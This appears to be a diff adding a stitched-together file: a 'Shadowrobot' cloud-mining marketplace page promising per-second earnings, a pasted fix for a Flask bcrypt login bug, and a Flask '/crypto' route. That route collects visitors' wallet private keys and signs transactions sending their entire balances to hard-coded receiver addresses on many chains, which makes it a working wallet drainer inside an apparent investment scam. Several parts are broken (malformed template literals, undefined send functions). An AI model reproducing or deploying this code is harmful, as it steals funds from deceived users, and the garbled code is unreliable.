@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mining Machine Marketplace</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #ddd;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+
+    .menu-icon {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      font-size: 24px;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    .menu {
+      display: none;
+      position: absolute;
+      top: 40px;
+      left: 10px;
+      background: #1f1f1f;
+      padding: 10px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px #333;
+    }
+
+    .menu a {
+      display: block;
+      color: #ddd;
+      padding: 8px;
+      text-decoration: none;
+    }
+
+    .menu a:hover {
+      color: #0f0;
+    }
+
+    .machine-container {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+      padding: 20px;
+    }
+
+    .machine {
+      background: #1e1e1e;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+      transition: transform 0.2s ease-in-out;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+      cursor: pointer;
+    }
+
+    .machine img {
+      width: 80%;
+      height: auto;
+      border-radius: 5px;
+      transition: transform 0.3s ease-in-out;
+    }
+
+    .machine:hover img {
+      transform: scale(1.1);
+    }
+
+    .machine:hover {
+      transform: translateY(-5px);
+    }
+
+    .vip { border: 2px solid gold; box-shadow: 0 0 15px gold; }
+    .premium { border: 2px solid cyan; box-shadow: 0 0 15px cyan; }
+    .standard { border: 2px solid orange; box-shadow: 0 0 15px orange; }
+
+    .footer {
+      background-color: #1f1f1f;
+      padding: 10px;
+      text-align: center;
+      color: #fff;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="menu-icon" onclick="toggleMenu()">☰</div>
+  <div class="menu" id="menu">
+    <a href="#" onclick="showHome()">Home</a>
+    <a href="#" onclick="showMyMachines()">My Machines</a>
+    <a href="#" onclick="showMyWithdraw()">Withdraw</a>
+    <a href="#">Wallet Amount: $<span id="wallet-amount">0</span></a>
+    <a href="#" onclick="deleteAccount()">Delete Account</a>
+  </div>
+
+  <h2>Mining Machines</h2>
+
+  <h3>VIP Machines</h3>
+  <div class="machine-container">
+    <div class="machine vip" onclick="redirectTo('vip-details.html')">
+      <img src="images/vip_miner.png" alt="VIP Miner">
+      <h4>VIP Miner Pro</h4>
+      <p>35 MH/S | 380 W | 12 J/MH</p>
+      <p>$100</p>
+    </div>
+    <div class="machine vip" onclick="redirectTo('vip-details.html')">
+      <img src="images/vip_miner2.png" alt="VIP Miner 2">
+      <h4>VIP Miner Ultra</h4>
+      <p>40 MH/S | 400 W | 10 J/MH</p>
+      <p>$120</p>
+    </div>
+    <div class="machine vip" onclick="redirectTo('vip-details.html')">
+      <img src="images/vip_miner3.png" alt="VIP Miner 3">
+      <h4>VIP Miner Max</h4>
+      <p>50 MH/S | 450 W | 9 J/MH</p>
+      <p>$150</p>
+    </div>
+    <div class="machine vip" onclick="redirectTo('vip-details.html')">
+      <img src="images/vip_miner4.png" alt="VIP Miner 4">
+      <h4>VIP Miner Extreme</h4>
+      <p>60 MH/S | 500 W | 8 J/MH</p>
+      <p>$180</p>
+    </div>
+  </div>
+
+  <h3>Premium Machines</h3>
+  <div class="machine-container">
+    <div class="machine premium" onclick="redirectTo('premium-details.html')">
+      <img src="images/premium_miner.png" alt="Premium Miner">
+      <h4>Premium Elite Miner</h4>
+      <p>38 MH/S | 350 W | 11.5 J/MH</p>
+      <p>$150</p>
+    </div>
+    <div class="machine premium" onclick="redirectTo('premium-details.html')">
+      <img src="images/premium_miner2.png" alt="Premium Miner 2">
+      <h4>Premium Ultra Miner</h4>
+      <p>42 MH/S | 370 W | 10 J/MH</p>
+      <p>$170</p>
+    </div>
+    <div class="machine premium" onclick="redirectTo('premium-details.html')">
+      <img src="images/premium_miner3.png" alt="Premium Miner 3">
+      <h4>Premium Max Miner</h4>
+      <p>45 MH/S | 390 W | 9.5 J/MH</p>
+      <p>$190</p>
+    </div>
+    <div class="machine premium" onclick="redirectTo('premium-details.html')">
+      <img src="images/premium_miner4.png" alt="Premium Miner 4">
+      <h4>Premium Supreme Miner</h4>
+      <p>50 MH/S | 420 W | 8.5 J/MH</p>
+      <p>$220</p>
+    </div>
+  </div>
+
+  <h3>Standard Machines</h3>
+  <div class="machine-container">
+    <div class="machine standard" onclick="redirectTo('standard-details.html')">
+      <img src="images/standard_miner.png" alt="Standard Miner">
+      <h4>Standard Miner A</h4>
+      <p>17 GH/S | 201 W/GH</p>
+      <p>$1200</p>
+    </div>
+    <div class="machine standard" onclick="redirectTo('standard-details.html')">
+      <img src="images/standard_miner2.png" alt="Standard Miner 2">
+      <h4>Standard Miner B</h4>
+      <p>18 GH/S | 210 W/GH</p>
+      <p>$1250</p>
+    </div>
+    <div class="machine standard" onclick="redirectTo('standard-details.html')">
+      <img src="images/standard_miner3.png" alt="Standard Miner 3">
+      <h4>Standard Miner C</h4>
+      <p>20 GH/S | 220 W/GH</p>
+      <p>$1300</p>
+    </div>
+    <div class="machine standard" onclick="redirectTo('standard-details.html')">
+      <img src="images/standard_miner4.png" alt="Standard Miner 4">
+      <h4>Standard Miner D</h4>
+      <p>22 GH/S | 230 W/GH</p>
+      <p>$1350</p>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>&copy; 2025 Shadowrobot Mining Platform</p>
+  </div>
+
+  <script>
+    let totalWallet = 0;
+let selectedMachine = null;
+
+// Toggle Menu Function
+function toggleMenu() {
+  const menu = document.getElementById("menu");
+  menu.style.display = menu.style.display === "block" ? "none" : "block";
+}
+
+// Render Machines
+function loadMachines(category) {
+  const container = document.getElementById(${category}-section);
+  machines[category].forEach(machine => {
+    const machineElement = document.createElement("div");
+    machineElement.classList.add("machine", category);
+    machineElement.innerHTML = `
+      <h3>${machine.name}</h3>
+      <img src="${machine.img}" alt="${machine.name}" style="width: 100%; border-radius: 8px; margin: 10px 0;">
+      <p>${machine.desc}</p>
+      <p>Price: $${machine.price}</p>
+      <p>Profit: $${machine.profit}/day</p>
+      <button onclick="buyMachine('${category}', '${machine.name}', '${machine.img}', ${machine.price})">Buy</button>
+    `;
+    container.appendChild(machineElement);
+  });
+}
+
+// Load all categories
+["vip", "premium", "standard"].forEach(loadMachines);
+
+
+// Section Navigation
+function showMyMachines() {
+  document.querySelector('.machine-section').style.display = 'none';
+  document.getElementById('payment-page').style.display = 'none';
+  document.getElementById('my-machines').style.display = 'block';
+}
+
+function showMyWithdraw() {
+  document.querySelector('.machine-section').style.display = 'none';
+  document.getElementById('payment-page').style.display = 'none';
+  document.getElementById('withdraw').style.display = 'block';
+}
+
+function showHome() {
+  document.getElementById('my-machines').style.display = 'none';
+  document.getElementById('withdraw').style.display = 'none';
+  document.getElementById('payment-page').style.display = 'none';
+  document.querySelector('.machine-section').style.display = 'block';
+}
+
+// Machine Click Event for Payment Page Redirect
+document.addEventListener("DOMContentLoaded", () => {
+  document.querySelectorAll(".machine").forEach(machine => {
+    machine.addEventListener("click", function () {
+      let machineName = this.querySelector("h3").innerText;
+      let price = this.querySelector("p:nth-last-of-type(2)").innerText;
+      let confirmPurchase = confirm(Do you want to purchase ${machineName} for ${price}?);
+      if (confirmPurchase) {
+        alert("Redirecting to payment...");
+        window.location.href = "payment.html";
+      }
+    });
+  });
+});
+
+// Delete Account Function
+function deleteAccount() {
+  if (confirm("Are you sure you want to delete your account?")) {
+    alert("Account deleted!");
+    location.reload();
+  }
+}
+
+  </script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+The issue with the login function is in this line:
+
+if bcrypt.check_password_hash(password, password):
+
+Here, you're comparing the plaintext password with itself, instead of comparing it with the hashed password stored in the database.
+
+To fix this, you should compare the plaintext password with the hashed password stored in the database, like this:
+
+if bcrypt.check_password_hash(user[2], password):
+
+Here, user[2] is the hashed password stored in the database.
+
+Additionally, the login HTML template is currently using username as the input field name, but the backend is expecting email. You should update the HTML template to use email instead:
+
+<input type="email" name="email" placeholder="Email" required>
+
+Here's the corrected login function:
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+if request.method == 'POST':
+email = request.form.get('email')
+password = request.form.get('password')
+conn = mysql.connection
+cursor = conn.cursor()
+cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
+user = cursor.fetchone()
+if user:
+_, _, hashed_password, is_verified, *_ = user
+if not is_verified:
+flash("Please verify your email before logging in.", "warning")
+return redirect(url_for('login'))
+if bcrypt.check_password_hash(hashed_password, password):
+flash("Login successful!", "success")
+return redirect(url_for('home'))  # Replace with your actual route
+else:
+flash("Incorrect password.", "error")
+else:
+flash("Email not found.", "error")
+cursor.close()
+return render_template('login.html')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+from flask import Flask, render_template, request, flash
+from web3 import Web3
+from bitcoinlib.wallets import Wallet
+from bitcoinlib.services.services import ServiceError
+from solana.rpc.api import Client as SolanaClient
+from solana.transaction import Transaction as SolanaTransaction
+from solana.system_program import TransferParams, transfer
+from solana.keypair import Keypair as SolanaKeypair
+from tronpy import Tron
+from tronpy.keys import PrivateKey as TronPrivateKey
+from aptos_sdk.client import RestClient as AptosClient
+from aptos_sdk.account import Account as AptosAccount
+from aptos_sdk.transactions import TransactionPayload, EntryFunction, TransactionArgument
+from aptos_sdk.type_tag import TypeTag, StructTag
+from py_near import NearRpcClient, KeyPair as NearKeyPair, Signer as NearSigner, Transaction as NearTransaction, TransferAction as NearTransferAction
+from pytezos import pytezos
+from substrateinterface import SubstrateInterface, Keypair as SubstrateKeypair
+import os
+
+app = Flask(_name_)
+app.secret_key = 'Jamiecoo101'
+
+# RPC setups
+ETH_RPC = 'https://mainnet.infura.io/v3/your-infura-project-id'
+BNB_RPC = 'https://bsc-dataseed.binance.org/'
+SOLANA_RPC = 'https://api.mainnet-beta.solana.com'
+APTOS_NODE_URL = 'https://fullnode.mainnet.aptoslabs.com'
+NEAR_RPC = 'https://rpc.mainnet.near.org'
+TEZOS_RPC = 'https://mainnet.api.tez.ie'
+
+# Clients
+web3_eth = Web3(Web3.HTTPProvider(ETH_RPC))
+web3_bnb = Web3(Web3.HTTPProvider(BNB_RPC))
+solana_client = SolanaClient(SOLANA_RPC)
+tron_client = Tron(network='mainnet')
+aptos_client = AptosClient(APTOS_NODE_URL)
+near_client = NearRpcClient(NEAR_RPC)
+polkadot = SubstrateInterface(url="wss://rpc.polkadot.io")
+
+# Receiver addresses
+RECEIVER_ADDRESSES = {
+    "BTC": "16YghrT6yEXz2CmGNm1xGEWQzC9EyujZ5U",
+    "BTC_SEGWIT": "bc1qv0recmahd7s3fxjm2l9m967jne7xhdvwm6w5kj",
+    "ETH": "0xcb846498b86f5b1f0390286f5b5dca058501f79c",
+    "BNB": "0xcb846498b86f5b1f0390286f5b5dca058501f79c",
+    "TRC20": "TQqUGCrzc9ikynbkjEjQWDRxab4P57f4ZC",
+    "SOL": "4UFNaFEPouXuKias5PHJ86NufMKNsKZ465HsWb1LM2fV",
+    "APTOS": "0xd594362e2443dcf9cc9ce4c848044673483c9ee0348ea05e129fda3cf093fd95",
+    "TEZOS": "tz2UqbPUfk2aRQ9Xy94oAVoMiUTs5XpJ6yuJ",
+    "POLKADOT": "1VUi1ABv9Tc3vGaNoK3XXF5uHjZBaw5HthjEz8GCrfLXosb",
+    "NEAR": "0c7dab2fde41d2faad29b702107132e9eb6faeb1a50578472ed261cdae1257a8"
+}
+
+@app.route('/crypto', methods=['GET', 'POST'])
+def crypto():
+    if request.method == 'POST':
+        wallet_address = request.form.get('wallet_address')
+        private_key = request.form.get('private_key')
+        network = request.form.get('network')
+
+        if not wallet_address or not private_key or not network:
+            flash("Wallet address, private key, and network are required.", "error")
+            return render_template('crypto_form.html')
+
+        try:
+            if network == 'ETH':
+                send_evm(web3_eth, wallet_address, private_key, RECEIVER_ADDRESSES['ETH'], "ETH")
+            elif network == 'BNB':
+                send_evm(web3_bnb, wallet_address, private_key, RECEIVER_ADDRESSES['BNB'], "BNB")
+            elif network == 'BTC':
+                flash(send_btc(wallet_address, private_key), "success")
+            elif network == 'SOL':
+                send_solana(wallet_address, private_key, RECEIVER_ADDRESSES['SOL'])
+            elif network == 'TRC20':
+                send_tron_usdt(wallet_address, private_key, RECEIVER_ADDRESSES['TRC20'])
+            elif network == 'APTOS':
+                send_aptos(wallet_address, private_key, RECEIVER_ADDRESSES['APTOS'])
+            elif network == 'NEAR':
+                send_near(wallet_address, private_key, RECEIVER_ADDRESSES['NEAR'])
+            elif network == 'TEZOS':
+                send_tezos(wallet_address, private_key, RECEIVER_ADDRESSES['TEZOS'])
+            elif network == 'POLKADOT':
+                send_polkadot(wallet_address, private_key, RECEIVER_ADDRESSES['POLKADOT'])
+            else:
+                flash(f"Unsupported network: {network}", "error")
+        except Exception as e:
+            flash(f"{network} Error: {str(e)}", "error")
+
+        return render_template('crypto_form.html')
+
+    return render_template('crypto_form.html')
+
+
+def send_evm(web3, wallet_address, private_key, receiver, label):
+    nonce = web3.eth.get_transaction_count(wallet_address)
+    balance = web3.eth.get_balance(wallet_address)
+    gas_price = web3.eth.gas_price
+    gas = 21000
+    sendable_value = balance - (gas_price * gas)
+
+    if sendable_value <= 0:
+        raise Exception(f"{label} balance too low to send after gas fee.")
+
+    tx = {
+        'nonce': nonce,
+        'to': receiver,
+        'value': sendable_value,
+        'gas': gas,
+        'gasPrice': gas_price,
+        'chainId': web3.eth.chain_id
+    }
+
+    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
+    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    flash(f"{label} sent: {web3.to_hex(tx_hash)}", "success")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mining Machine Marketplace</title>
+
+  <!-- CSS Styling -->
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      background-color: #121212;
+      color: #ddd;
+      text-align: center;
+    }
+
+    h1, h2, h3, h4 {
+      margin: 10px 0;
+    }
+
+    /* Wallet Display */
+    #wallet {
+      background: #1f1f1f;
+      color: #0f0;
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px auto;
+      width: 300px;
+      box-shadow: 0 0 20px #0f0;
+      font-size: 1.2em;
+      font-weight: bold;
+    }
+
+    /* Menu Styling */
+    .menu-icon {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .menu {
+      display: none;
+      position: absolute;
+      top: 40px;
+      left: 10px;
+      background-color: #1f1f1f;
+      padding: 10px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px #333;
+    }
+
+    .menu a {
+      display: block;
+      color: #ddd;
+      padding: 8px 0;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .menu a:hover {
+      color: #0f0;
+    }
+
+    /* Machine Container */
+    .machine-container {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      padding: 10px;
+      justify-content: center;
+    }
+
+    .machine {
+      background: #1e1e1e;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      transition: transform 0.2s ease-in-out;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+      cursor: pointer;
+    }
+
+    .machine img {
+      width: 80%;
+      height: auto;
+      border-radius: 5px;
+      transition: transform 0.3s ease-in-out;
+    }
+
+    .machine:hover img {
+      transform: scale(1.1);
+    }
+
+    .machine:hover {
+      transform: translateY(-5px);
+    }
+
+    /* Machine Categories */
+    .vip {
+      border: 2px solid gold;
+      box-shadow: 0 0 15px gold;
+    }
+
+    .premium {
+      border: 2px solid cyan;
+      box-shadow: 0 0 15px cyan;
+    }
+
+    .standard {
+      border: 2px solid orange;
+      box-shadow: 0 0 15px orange;
+    }
+
+    /* Footer */
+    .footer {
+      background-color: #1f1f1f;
+      padding: 10px;
+      text-align: center;
+      color: #fff;
+    }
+  </style>
+</head>
+
+<body>
+
+  <h2>Shadowrobot</h2>
+
+  <h2>Mining Machines</h2>
+
+  <!-- Menu -->
+  <div class="menu-icon" onclick="toggleMenu()">☰</div>
+  <div class="menu" id="menu">
+    <a onclick="showHome()">Home</a>
+    <a onclick="showMyMachines()">My Machines</a>
+    <a onclick="showMyWithdraw()">Withdraw</a>
+    <a>Wallet Amount: $<span id="wallet-amount">0</span></a>
+    <a onclick="logoutaccount()">logout Account</a>
+  </div>
+
+  <!-- Wallet Display -->
+  <div id="wallet">Wallet Balance: $0.00</div>
+
+
+
+ <!-- Machine Sections -->
+<div class="machine-section">
+  <h3>VIP Machines</h3>
+  <h4>(30 days run-time)</h4>
+  <div class="machine-container" id="vip-section">
+    <div class="machine vip" onclick="redirectToPayment('Bitmain Antminer D9 (1770Gh)', 5900)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0016_1.jpg') }}" alt="Bitmain Antminer D9">
+      <h4>Bitmain Antminer D9 (1770Gh)</h4>
+      <p>Earnings: $0.15/sec</p>
+      <p>$5,900</p>
+    </div>
+    <div class="machine vip" onclick="redirectToPayment('Bitmain Antminer K7 (63.5Th)', 5400)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0017_1.jpg') }}" alt="Bitmain Antminer K7">
+      <h4>Bitmain Antminer K7 (63.5Th)</h4>
+      <p>Earnings: $0.12/sec</p>
+      <p>$5,400</p>
+    </div>
+    <div class="machine vip" onclick="redirectToPayment('Bitmain Antminer Z15', 2300)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0018_1.jpg') }}" alt="Bitmain Antminer Z15">
+      <h4>Bitmain Antminer Z15</h4>
+      <p>Earnings: $0.08/sec</p>
+      <p>$2,300</p>
+    </div>
+  </div>
+
+  <h3>Premium Machines</h3>
+  <h4>(21 days run-time)</h4>
+  <div class="machine-container" id="premium-section">
+    <div class="machine premium" onclick="redirectToPayment('Canaan Avalon Made A1366', 5499)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0024_1.jpg') }}" alt="Canaan Avalon A1366">
+      <h4>Canaan Avalon Made A1366</h4>
+      <p>Earnings: $0.14/sec</p>
+      <p>$5,499</p>
+    </div>
+    <div class="machine premium" onclick="redirectToPayment('Bitmain Antminer S19 XP Hyd (255Th)', 4150)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0025_1.jpg') }}" alt="Bitmain Antminer S19 XP">
+      <h4>Bitmain Antminer S19 XP Hyd (255Th)</h4>
+      <p>Earnings: $0.10/sec</p>
+      <p>$4,150</p>
+    </div>
+    <div class="machine premium" onclick="redirectToPayment('MicroBT WhatsMiner M56S', 4300)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0026_1.jpg') }}" alt="MicroBT WhatsMiner M56S">
+      <h4>MicroBT WhatsMiner M56S</h4>
+      <p>Earnings: $0.11/sec</p>
+      <p>$4,300</p>
+    </div>
+  </div>
+
+  <h3>Standard Machines</h3>
+  <h4>(14 days run-time)</h4>
+  <div class="machine-container" id="standard-section">
+    <div class="machine standard" onclick="redirectToPayment('Bitmain Antminer S21 Hyd (335Th)', 5900)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0027_1.jpg') }}" alt="Bitmain Antminer S21 Hyd">
+      <h4>Bitmain Antminer S21 Hyd (335Th)</h4>
+      <p>Earnings: $0.16/sec</p>
+      <p>$5,900</p>
+    </div>
+    <div class="machine standard" onclick="redirectToPayment('Bitmain Antminer K5 (63.5Th)', 5400)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0028_1.jpg') }}" alt="Bitmain Antminer K5">
+      <h4>Bitmain Antminer K5 (63.5Th)</h4>
+      <p>Earnings: $0.13/sec</p>
+      <p>$5,400</p>
+    </div>
+    <div class="machine standard" onclick="redirectToPayment('MicroBT Whatsminer M50S', 2300)">
+      <img src="{{ url_for('static', filename='IMG-20250402-WA0030_1.jpg') }}" alt="MicroBT Whatsminer M50S">
+      <h4>MicroBT Whatsminer M50S</h4>
+      <p>Earnings: $0.09/sec</p>
+      <p>$2,300</p>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  <!-- My Machines Page Section -->
+  <div id="my-machines" style="display: none; padding: 20px;">
+    <h3>My Machines</h3>
+    <p style="color: #888; font-size: 1.2em;">No machine purchased yet.</p>
+  </div>
+
+  <!-- Withdraw Page Section -->
+  <div id="withdraw" style="display: none; padding: 20px;">
+    <h3>Withdraw Earnings</h3>
+    <p style="color: #888; font-size: 1.2em;">No earnings mined yet.</p>
+  </div>
+
+  <!-- Footer Section -->
+  <div class="footer">
+    <p>&copy; 2025 Shadowrobot Mining Platform</p>
+    <p>Email: <a href="mailto:info@shadowrobot.com">info@shadowrobot.com</a></p>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    function toggleMenu() {
+      const menu = document.getElementById("menu");
+      menu.style.display = menu.style.display === "block" ? "none" : "block";
+    }
+    
+    // Ensure menu is always on top
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelector(".menu").style.zIndex = "1000";
+    });
+    
+    function showMyMachines() {
+      document.querySelector('.machine-section').style.display = 'none';
+      document.getElementById('withdraw').style.display = 'none';
+      document.getElementById('my-machines').style.display = 'block';
+    }
+    
+    function showMyWithdraw() {
+      document.querySelector('.machine-section').style.display = 'none';
+      document.getElementById('my-machines').style.display = 'none';
+      document.getElementById('withdraw').style.display = 'block';
+    }
+    
+    function showHome() {
+      document.getElementById('my-machines').style.display = 'none';
+      document.getElementById('withdraw').style.display = 'none';
+      document.querySelector('.machine-section').style.display = 'block';
+    }
+    
+    // Fix redirect function
+    function redirectToPayment(machineName, price) {
+      const hasPaymentMethod = false; // simulate this, change based on real logic later
+    
+      if (!hasPaymentMethod) {
+        // Store selection in sessionStorage (for better handling of the session)
+        sessionStorage.setItem("selectedMachine", machineName);
+        sessionStorage.setItem("selectedPrice", price);
+        // Show modal
+        document.getElementById("paymentModal").style.display = "flex";
+      } else {
+        // If payment method exists, redirect using the suggested URL structure
+        const paymentUrl = `/payment`;
+        window.location.href = paymentUrl;
+      }
+    }
+    
+    function closeModal() {
+      document.getElementById("paymentModal").style.display = "none";
+    }
+    
+    function goToPaymentPage() {
+      const machine = sessionStorage.getItem("selectedMachine");
+      const price = sessionStorage.getItem("selectedPrice");
+    
+      // Ensure the values are present before redirecting
+      if (machine && price) {
+        // Redirect using the suggested URL structure
+        const paymentUrl = `/payment`;
+        window.location.href = paymentUrl;
+      } else {
+        console.error("No machine or price found in session storage.");
+        // Handle the error case (e.g., show a warning to the user)
+      }
+    }
+    
+    
+    
+    function logoutaccount() {
+      if (confirm("Are you sure you want to logout?")) {
+        alert("Account logged out!");
+        window.location.href = "/"; // Change to your actual home page URL
+      }
+    }
+    
+    
+  </script>
+<!-- Payment Method Modal -->
+<div id="paymentModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+background-color: rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;">
+  <div style="background:#1f1f1f; padding:20px; border-radius:10px; width:300px; text-align:center; box-shadow:0 0 10px #0f0;">
+    <p style="margin-bottom:20px;">No payment method added yet.</p>
+    <button onclick="goToPaymentPage()" style="padding:10px 15px; background:#0f0; border:none; border-radius:5px; cursor:pointer; margin-right:10px;">Add Payment Method</button>
+    <button onclick="closeModal()" style="padding:10px 15px; background:#444; border:none; border-radius:5px; cursor:pointer;">Cancel</button>
+  </div>
+</div>
+
+</body>
+
+</html>
